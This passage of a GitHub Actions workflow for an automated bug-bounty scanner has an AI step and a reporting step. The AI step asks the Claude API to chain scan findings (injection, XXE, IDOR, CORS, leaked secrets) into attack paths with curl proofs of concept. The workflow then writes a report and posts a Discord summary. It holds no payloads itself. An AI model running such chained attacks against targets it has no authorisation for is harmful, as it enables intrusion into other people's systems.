          findings_exist = any((v.strip() and v not in ("No XXE findings\n","No GraphQL findings\n","No IDOR findings\n","")) for v in [injections,xxe,graphql,idor,sensitive,cors])

          if not findings_exist or not api_key:
              with open(os.path.join(rd,"ai_agent","chained_analysis.json"),"w") as f:
                  json.dump({"message":"No findings to chain-analyze"},f,indent=2)
              print("No findings - skip chain analysis")
              sys.exit(0)

          prompt = f"""Analyze for {target}:
          INJECTIONS: {injections}
          XXE: {xxe}
          GRAPHQL: {graphql}
          IDOR: {idor}
          SENSITIVE: {sensitive}
          CORS: {cors}

          Return JSON:
          {{"chaining_opportunities":[{{"chain":"how to combine","impact":"critical/high","steps":["step1","step2"]}}],"confirmed_findings":[{{"finding":"URL/type","poc":"curl","impact":"what attacker gains"}}],"priority_recommendations":["fix first"]}}"""

          payload = json.dumps({"model":"claude-sonnet-4-20250514","max_tokens":4096,"messages":[{"role":"user","content":prompt}]}).encode()
          req = urllib.request.Request("https://api.anthropic.com/v1/messages", data=payload, headers={"x-api-key":api_key,"anthropic-version":"2023-06-01","content-type":"application/json"}, method="POST")

          try:
              with urllib.request.urlopen(req, timeout=120) as r:
                  result = json.loads(r.read())
              text = result["content"][0]["text"]
              m = re.search(r'\{.*\}', text, re.DOTALL)
              if m:
                  with open(os.path.join(rd,"ai_agent","chained_analysis.json"),"w") as f:
                      f.write(m.group(0))
              print("✅ Chain analysis done")
          except Exception as e:
              print(f"Chain error: {e}", file=sys.stderr)
          PYEOF
          python3 /tmp/ai_chain.py

      # ============================================================
      # 17. AI FINAL REPORT
      # ============================================================
      - name: "📋 AI Final Security Report"
        continue-on-error: true
        if: ${{ env.ANTHROPIC_API_KEY != '' }}
        env:
          RD: results/${{ env.TIMESTAMP }}
        run: |
          cat > /tmp/ai_report.py <<'PYEOF'
          import json, os, urllib.request, urllib.error, sys, datetime

          api_key = os.environ.get("ANTHROPIC_API_KEY", "")
          target = os.environ.get("TARGET", "")
          rd = os.environ.get("RD", "results/" + os.environ.get("TIMESTAMP", ""))

          def readf(path, cap=3000):
              try:
                  with open(os.path.join(rd, path)) as f: return f.read()[:cap]
              except: return "N/A"

          injections = readf("ai_agent/injection_findings.json", 3000)
          xxe = readf("ai_agent/xxe_findings.txt")
          gql = readf("ai_agent/graphql_findings.txt")
          idor = readf("ai_agent/idor_findings.txt")
          chain = readf("ai_agent/chained_analysis.json", 2000)
          nuclei_data = readf("nuclei/findings.jsonl", 2000)
          cors_data = readf("cors/vulnerable.txt")
          sensitive = readf("files/sensitive.txt")
          takeover = readf("nuclei/takeover.jsonl", 1000)

          core = [injections, xxe, gql, idor, nuclei_data, cors_data, sensitive]
          has = any(v.strip() not in ("N/A","","No XXE findings\n","No GraphQL findings\n","No IDOR findings\n") for v in core)

          if not has and not api_key:
              report = f"# Security Report: {target}\n**{datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}**\n\n## No Confirmed Vulnerabilities\nClean scan. All checks passed."
              os.makedirs(os.path.join(rd,"ai"), exist_ok=True)
              with open(os.path.join(rd,"ai","security_report.md"),"w") as f: f.write(report)
              print("Clean report written")
              sys.exit(0)

          prompt = f"""You are a senior bug bounty hunter writing FINAL report for {target}.
          AGENT FINDINGS - Injections: {injections} | XXE: {xxe} | GraphQL: {gql} | IDOR: {idor} | Chaining: {chain}
          SCAN FINDINGS - Nuclei: {nuclei_data} | CORS: {cors_data} | Sensitive: {sensitive} | Takeover: {takeover}

          Write professional bug bounty report:
          # Executive Summary
          # Findings (ONLY real, confirmed vulnerabilities - no speculation)
          For each: ## [Severity] Title | **Type:** | **URL:** | **Severity:** | **Summary:** | **Steps to Reproduce:** | **PoC:** (exact command) | **Impact:** | **Remediation:** |
          # Chaining Opportunities
          # Statistics
          # Top 5 Recommendations
          If nothing is confirmed, write 'No confirmed findings this run.' under Findings."""

          payload = json.dumps({"model":"claude-sonnet-4-20250514","max_tokens":8192,"messages":[{"role":"user","content":prompt}]}).encode()
          req = urllib.request.Request("https://api.anthropic.com/v1/messages", data=payload, headers={"x-api-key":api_key,"anthropic-version":"2023-06-01","content-type":"application/json"}, method="POST")

          try:
              with urllib.request.urlopen(req, timeout=120) as r:
                  result = json.loads(r.read())
              report = result["content"][0]["text"]
              os.makedirs(os.path.join(rd,"ai"), exist_ok=True)
              with open(os.path.join(rd,"ai","security_report.md"),"w") as f:
                  f.write(f"# AI Security Report: {target}\n\n{report}")
              print(f"✅ Report: {len(report)} chars")
          except Exception as e:
              print(f"Report error: {e}", file=sys.stderr)
          PYEOF
          python3 /tmp/ai_report.py

      # ============================================================
      # 18. UPLOAD ALL RESULTS
      # ============================================================
      - name: "📤 Upload All Results"
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: results-${{ env.TIMESTAMP }}-${{ env.TARGET }}
          path: results/${{ env.TIMESTAMP }}/
          retention-days: 30

      # ============================================================
      # 19. DISCORD NOTIFICATION
      # ============================================================
      - name: "📣 Discord Notification"
        if: ${{ always() && inputs.discord_notify == 'true' && env.DISCORD_WEBHOOK != '' }}
        timeout-minutes: 3
        env:
          RD: results/${{ env.TIMESTAMP }}
        run: |
          SUBS=$(wc -l < "$RD/subdomains/all_subs.txt" 2>/dev/null || echo 0)
          LIVE=$(wc -l < "$RD/live/live.txt" 2>/dev/null || echo 0)
          INJECT=$(grep -cE '\[(XSS|SSTI|SQLi|LFI|SSRF|Command|Redirect)\]' "$RD/ai_agent/injection_findings.txt" 2>/dev/null || echo 0)
          XXE=$(grep -c '\[XXE\]' "$RD/ai_agent/xxe_findings.txt" 2>/dev/null || echo 0)
          GQL=$(grep -c '\[GRAPHQL' "$RD/ai_agent/graphql_findings.txt" 2>/dev/null || echo 0)
          IDOR=$(grep -c '\[IDOR\]' "$RD/ai_agent/idor_findings.txt" 2>/dev/null || echo 0)
          NUCLEI=$(wc -l < "$RD/nuclei/findings.jsonl" 2>/dev/null || echo 0)
          SENS=$(wc -l < "$RD/files/sensitive.txt" 2>/dev/null || echo 0)
          CORS=$(wc -l < "$RD/cors/vulnerable.txt" 2>/dev/null || echo 0)
          TOTAL_AGENT=$(( INJECT + XXE + GQL + IDOR ))

          COLOR=5814783; TITLE="✅ Scan Complete"
          if [ "$TOTAL_AGENT" -gt 0 ] || [ "$SENS" -gt 0 ] || [ "$CORS" -gt 0 ]; then
            COLOR=15158332; TITLE="🚨 Vulnerabilities Found"
          elif [ "$NUCLEI" -gt 5 ]; then
            COLOR=16744192; TITLE="🔶 Findings Require Review"
          fi

          jq -n \
            --arg t "${{ env.TARGET }}" \
            --arg title "$TITLE" \
            --arg subs "$SUBS" \
            --arg live "$LIVE" \
            --arg inject "$INJECT" \
            --arg xxe "$XXE" \
            --arg gql "$GQL" \
            --arg idor "$IDOR" \
            --arg nuclei "$NUCLEI" \
            --arg sens "$SENS" \
            --arg cors "$CORS" \
            --arg run "${{ github.run_number }}" \
            --arg url "https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}" \
            --argjson color "$COLOR" \
          '{
            username:"🎯 BugHunter AI",
            embeds:[{
              title:($title+": "+$t), color:$color, url:$url,
              fields:[
                {name:"🌐 Recon", value:("Subs: **"+$subs+"** | Live: **"+$live+"**"), inline:false},
                {name:"🧠 AI Agent", value:("Injections: **"+$inject+"** | XXE: **"+$xxe+"** | GraphQL: **"+$gql+"** | IDOR: **"+$idor+"**"), inline:false},
                {name:"🔓 Scanner", value:("Nuclei: **"+$nuclei+"** | Secrets: **"+$sens+"** | CORS: **"+$cors+"**"), inline:false},
                {name:"🔗 Results", value:("[View Run]("+$url+")"), inline:true}
              ],
              footer:{text:("Run #"+$run+" | AI Autonomous Hunter")}
            }]
          }' | curl -s -X POST "${{ secrets.DISCORD_WEBHOOK }}" -H "Content-Type: application/json" -d @- || true
